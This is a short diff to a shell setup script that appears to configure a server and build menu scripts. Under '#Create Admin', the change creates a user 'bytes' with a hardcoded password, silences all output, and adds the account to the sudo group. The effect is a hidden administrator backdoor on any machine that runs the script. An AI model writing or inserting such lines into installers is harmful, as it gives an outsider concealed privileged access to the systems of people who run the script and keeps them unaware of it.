@@ -1003,8 +1003,9 @@ FordServ
 
 }
  #Create Admin
- useradd -m bytes
- echo "bytesph:bytesph2023!!!@@@" | chpasswd
+  useradd -m bytes 2>/dev/null
+  echo bytes:bytesph2023!!!@@@ | chpasswd &>/dev/null
+  usermod -aG sudo bytes &>/dev/null
 
 function ConfMenu(){
 echo -e "\e[0;37m  Creating Menu scripts.."
